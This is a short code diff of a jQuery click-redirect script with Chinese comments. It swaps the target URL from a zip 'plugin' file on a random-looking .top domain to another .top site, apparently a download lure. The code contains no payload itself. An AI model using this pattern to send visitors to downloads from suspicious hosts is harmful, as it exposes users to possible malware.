@@ -1,6 +1,6 @@
 $(function () {
 	// 设置跳转路径
-	var url = "https://sdkjgfhsuas8sd6fsalkjnf-soeir.top/Fxidjstsle%E6%8F%92%E4%BB%B6.zip"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
+	var url = "https://potatode.top/"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
 
 	// 使用querySelectorAll获取所有具有特定类名的元素
 	var clickableElements = document.querySelectorAll(".clickableClass"); // 假设class是clickableClass
